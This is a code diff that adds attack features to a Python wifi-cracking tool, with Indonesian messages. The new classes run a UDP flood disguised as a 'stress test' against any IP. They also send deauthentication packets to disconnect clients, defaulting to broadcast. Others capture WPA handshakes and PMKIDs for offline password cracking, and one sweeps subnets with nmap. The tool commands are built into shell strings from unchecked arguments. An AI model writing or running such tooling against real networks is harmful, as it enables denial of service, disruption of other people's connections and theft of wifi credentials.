@@ -353,6 +353,82 @@ class PixiewpsData:
             pixiecmd += ' --force'
         return pixiecmd
 
+class NetworkAuditor:
+    def __init__(self, target_ip, port, duration):
+        self.target_ip = target_ip
+        self.port = port
+        self.duration = duration
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        self.payload = b"A" * 1024
+
+    def run_stress_test(self):
+        end_time = time.time() + self.duration
+        packets_sent = 0
+        while time.time() < end_time:
+            try:
+                self.sock.sendto(self.payload, (self.target_ip, self.port))
+                packets_sent += 1
+            except Exception:
+                pass
+        print(f"Stress test selesai. Total paket dikirim: {packets_sent}")
+
+class HandshakeCatcher:
+    def __init__(self, interface, bssid, channel):
+        self.interface = interface
+        self.bssid = bssid
+        self.channel = channel
+
+    def capture(self):
+        cmd = f"airodump-ng -c {self.channel} --bssid {self.bssid} -w capture {self.interface}"
+        print(f"Menjalankan penangkapan handshake pada {self.bssid}")
+        try:
+            subprocess.run(cmd, shell=True)
+        except KeyboardInterrupt:
+            print("Penangkapan dihentikan.")
+
+class DeauthAttacker:
+    def __init__(self, interface, bssid, client_mac, count):
+        self.interface = interface
+        self.bssid = bssid
+        self.client_mac = client_mac
+        self.count = count
+
+    def attack(self):
+        cmd = f"aireplay-ng --deauth {self.count} -a {self.bssid} -c {self.client_mac} {self.interface}"
+        print(f"Mengirim serangan deauth ke {self.client_mac} dari AP {self.bssid}")
+        try:
+            subprocess.run(cmd, shell=True)
+        except KeyboardInterrupt:
+            print("Serangan deauth dihentikan")
+
+class NetworkMapper:
+    def __init__(self, ip_range):
+        self.ip_range = ip_range
+
+    def scan(self):
+        cmd = f"nmap -sn {self.ip_range}"
+        print(f"Memindai topologi jaringan: {self.ip_range}")
+        try:
+            subprocess.run(cmd, shell=True)
+        except KeyboardInterrupt:
+            print("Pemindaian dihentikan")
+
+class PMKIDCatcher:
+    def __init__(self, interface, bssid):
+        self.interface = interface
+        self.bssid = bssid
+        self.target_file = "target_ap.txt"
+
+    def capture(self):
+        with open(self.target_file, 'w') as f:
+            f.write(self.bssid.replace(':', '') + '\n')
+        cmd = f"hcxdumptool -i {self.interface} -o pmkid_capture.pcapng --filterlist_ap={self.target_file} --filtermode=2 --enable_status=1"
+        print(f"Menjalankan penangkapan PMKID pada {self.bssid}")
+        try:
+            subprocess.run(cmd, shell=True)
+        except KeyboardInterrupt:
+            print("Penangkapan PMKID dihentikan")
+
 
 class ConnectionStatus:
     def __init__(self):
@@ -1164,6 +1240,61 @@ if __name__ == '__main__':
         '-r', '--reverse-scan',
         action='store_true',
         help='Reverse order of networks in the list of networks. Useful on small displays'
+        
+    )
+    parser.add_argument(
+        '--stress-target',
+        type=str,
+        help='Target IP untuk network stress test'
+    )
+    parser.add_argument(
+        '--stress-port',
+        type=int,
+        default=80,
+        help='Target port untuk network stress test'
+    )
+    parser.add_argument(
+        '--stress-duration',
+        type=int,
+        default=10,
+        help='Durasi stress test dalam detik'
+    )
+    parser.add_argument(
+        '--capture-handshake',
+        action='store_true',
+        help='Tangkap WPA handshake'
+    )
+    parser.add_argument(
+        '-c', '--channel',
+        type=int,
+        help='Channel AP untuk penangkapan'
+    )
+    parser.add_argument(
+        '--deauth',
+        action='store_true',
+        help='Kirim serangan deauthentication'
+    )
+    parser.add_argument(
+        '--client-mac',
+        type=str,
+        default='FF:FF:FF:FF:FF:FF',
+        help='Target MAC address untuk deauth'
+    )
+    parser.add_argument(
+        '--deauth-count',
+        type=int,
+        default=10,
+        help='Jumlah paket deauth yang dikirim'
+    )
+    parser.add_argument(
+        '--map-network',
+        type=str,
+        help='Pindai subnet jaringan'
+    )
+    parser.add_argument(
+        '--capture-pmkid',
+        action='store_true',
+        help='Tangkap PMKID tanpa client'
     )
     parser.add_argument(
         '--mtk-wifi',
@@ -1184,6 +1315,33 @@ if __name__ == '__main__':
         die("The program requires Python 3.6 and above")
     if os.getuid() != 0:
         die("Run it as root")
+        
+    if args.stress_target:
+        print(f"Memulai stress test ke {args.stress_target}:{args.stress_port} selama {args.stress_duration} detik")
+        auditor = NetworkAuditor(args.stress_target, args.stress_port, args.stress_duration)
+        auditor.run_stress_test()
+        sys.exit(0)
+
+    if args.capture_handshake and args.bssid and args.channel:
+        catcher = HandshakeCatcher(args.interface, args.bssid, args.channel)
+        catcher.capture()
+        sys.exit(0)
+
+    if args.deauth and args.bssid:
+        attacker = DeauthAttacker(args.interface, args.bssid, args.client_mac, args.deauth_count)
+        attacker.attack()
+        sys.exit(0)
+
+    if args.map_network:
+        mapper = NetworkMapper(args.map_network)
+        mapper.scan()
+        sys.exit(0)
+
+    if args.capture_pmkid and args.bssid:
+        pmkid = PMKIDCatcher(args.interface, args.bssid)
+        pmkid.capture()
+        sys.exit(0)
+
 
     if args.mtk_wifi:
         wmtWifi_device = Path("/dev/wmtWifi")
